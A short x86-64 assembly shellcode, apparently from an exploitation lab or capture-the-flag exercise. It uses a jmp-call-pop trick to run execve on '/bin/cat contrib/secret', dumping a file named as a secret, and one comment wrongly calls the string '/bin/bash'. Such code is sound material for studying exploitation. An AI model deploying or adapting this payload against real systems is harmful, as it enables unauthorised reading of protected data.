[bits 64]

section .text
global _start
_start:
	jmp short message
dowork:
	pop rdi

	; 1 - address of /bin/cat string
	push rdi

	; execve
	xor rax, rax
	add ax, 59
	
	; array
	push 0

	; skip /bin/bash\0
	add di, 9
	push rdi
	sub di, 9
	push rdi

	; 2 - array address
	mov rsi, rsp
	; 3 - NULL
	xor rdx, rdx
	
	syscall

message:
	call dowork
	db "/bin/cat", 0, "contrib/secret", 0
